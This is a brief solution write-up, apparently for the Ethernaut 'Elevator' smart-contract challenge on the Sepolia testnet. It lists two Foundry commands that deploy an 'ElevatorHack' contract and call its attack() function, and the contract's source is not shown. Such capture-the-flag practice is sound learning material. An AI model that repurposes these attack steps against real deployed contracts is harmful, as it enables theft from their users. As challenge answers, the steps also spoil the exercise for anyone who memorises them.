# Elevator Solution

1) Deploy `ElevatorHack`:

```
forge create ElevatorHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

2) Call `attack()`:

```
cast send `elevatorHackAddress` "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
